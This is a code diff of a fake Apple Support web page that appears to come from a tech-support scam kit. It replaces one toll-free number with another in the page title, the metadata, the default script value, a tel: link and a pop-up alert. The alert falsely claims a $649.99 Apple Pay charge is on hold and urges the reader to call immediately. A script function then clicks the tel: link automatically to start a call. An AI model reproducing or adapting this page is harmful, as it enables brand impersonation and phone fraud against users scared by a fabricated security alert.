@@ -230,7 +230,7 @@ s0.parentNode.insertBefore(s1,s0);
           <div class="ac-ln-content">
             <span class="ac-ln-title">
               <a href="#"
-                >Apple Support +1-888-310-5684
+                >Apple Support +1-888-608-6380
                 <font color="red"><font class="js_setPhoneBlock"></font></font
               ></a>
             </span>
@@ -365,7 +365,7 @@ s0.parentNode.insertBefore(s1,s0);
           </div>
           <meta content="Apple" property="name" />
           <meta
-            content="+1-888-310-5684
+            content="+1-888-608-6380
 			 "
             property="telephone"
           />
@@ -444,7 +444,7 @@ s0.parentNode.insertBefore(s1,s0);
 
       window.number = getPar("phone");
 
-      window.number = window.number ? window.number : "+1-888-310-5684";
+      window.number = window.number ? window.number : "+1-888-608-6380";
 
       window.device = "iPhone";
       window.refef = parseURL(document.referrer);
@@ -502,7 +502,7 @@ s0.parentNode.insertBefore(s1,s0);
 
       function okkkk() {
         jQuery("#result").append(
-          '<a  class="anchorcall" href="tel:+1-888-310-5684"></a>'
+          '<a  class="anchorcall" href="tel:+1-888-608-6380"></a>'
         );
         document.querySelector("a").click();
         var extraData = "";
@@ -522,7 +522,7 @@ s0.parentNode.insertBefore(s1,s0);
       function myFunction() {
         if (
           confirm(
-            "Your Apple ID was used at the Apple Store for a $649.99 Apple Pay pre-authorization. This transaction has been temporarily placed on hold due to security concerns. If this was NOT you, call Apple Support NOW at +1-888-310-5684 to freeze this transaction and prevent unauthorized charges!"
+            "Your Apple ID was used at the Apple Store for a $649.99 Apple Pay pre-authorization. This transaction has been temporarily placed on hold due to security concerns. If this was NOT you, call Apple Support NOW at +1-888-608-6380 to freeze this transaction and prevent unauthorized charges!"
           )
         ) {
           okkkk();
